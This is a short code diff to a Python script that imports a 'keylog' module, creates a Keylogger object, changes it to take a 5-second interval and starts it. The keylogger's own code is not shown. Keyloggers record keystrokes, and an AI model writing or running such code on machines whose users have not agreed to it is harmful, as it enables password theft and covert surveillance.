@@ -4,5 +4,5 @@
 
 import keylog
 
-my_keylogger = keylog.Keylogger()
+my_keylogger = keylog.Keylogger(5) #pass value of 5 seconds
 my_keylogger.start()
